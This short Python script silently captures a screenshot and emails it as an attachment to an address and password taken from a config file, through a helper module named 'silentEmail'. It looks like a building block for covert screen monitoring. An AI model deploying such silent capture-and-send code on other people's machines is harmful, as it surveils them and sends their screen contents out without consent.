import silentEmail
import config

def Main():
	body = "Screenshot Captured, PFA."
	filename = silentEmail.capture_ss()
	silentEmail.attach_and_mail(config.EMAIL_ADDRESS, config.EMAIL_ADDRESS,
                 config.PASSWORD, filename, body, filename)

if __name__ == "__main__":
	Main()
